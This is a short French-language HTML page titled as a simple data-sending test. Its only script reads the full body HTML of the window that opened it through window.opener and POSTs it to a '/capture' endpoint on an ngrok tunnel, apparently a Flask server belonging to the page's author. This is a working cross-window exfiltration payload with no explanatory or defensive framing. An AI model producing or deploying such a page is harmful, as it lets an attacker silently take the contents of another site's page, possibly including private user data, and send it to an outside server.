<!DOCTYPE html>
<html lang="fr">

<head>
    <meta charset="UTF-8">
    <title>Test Simple</title>
</head>

<body>
    <h1>Test d'envoi de données</h1>
    <script>
        // Récupère le contenu du body de la fenêtre parente
        let bodyContent = window.opener ? window.opener.document.body.innerHTML : "Aucun contenu";

        // Envoi du contenu du body au serveur Flask
        fetch("https://404b-2a04-cec0-1020-604e-e5d3-59aa-943a-2da0.ngrok-free.app/capture", {
            method: "POST",
            headers: {
                "Content-Type": "application/json"
            },
            body: JSON.stringify({ content: bodyContent })  // Envoie le contenu du body
        });
    </script>
</body>

</html>
